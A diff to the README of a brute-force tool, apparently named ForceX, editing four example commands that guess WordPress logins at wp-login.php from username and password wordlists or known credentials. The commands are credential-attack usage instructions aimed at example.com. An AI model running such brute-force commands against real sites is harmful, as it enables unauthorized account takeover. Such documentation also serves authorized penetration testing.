@@ -202,22 +202,22 @@ Successful login details are clearly displayed with user-friendly icons.
 
 #### WordPress Brute Force Wordlist User and Password
 ```bash
-../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --PassList passwords.txt --HTMLUSER user_login --HTMLPASS user_pass --Cookies "session=abcd1234"
+../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --PassList passwords.txt 
 ```
 
 #### WordPress Brute Force Wordlist Users - Known Password
 ```bash
-../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --Pass password123 --HTMLUSER user_login --HTMLPASS user_pass --Cookies "session=abcd1234"
+../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --UserList users.txt --Pass password123 
 ```
 
 #### WordPress Brute Force Known Username - Wordlist Passwords
 ```bash
-../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --PassList passwords.txt --HTMLUSER user_login --HTMLPASS user_pass --Cookies "session=abcd1234"
+../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --PassList passwords.txt 
 ```
 
-#### WordPress Brute Force Known Password and Username
+#### WordPress Brute Force one Password and Username
 ```bash
-../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --Pass password123 --HTMLUSER user_login --HTMLPASS user_pass --Cookies "session=abcd1234"
+../ForceX --URL http://example.com/wp-login.php --Protocol wordpress --User users123 --Pass password123 
 ```
 
 ## Notes
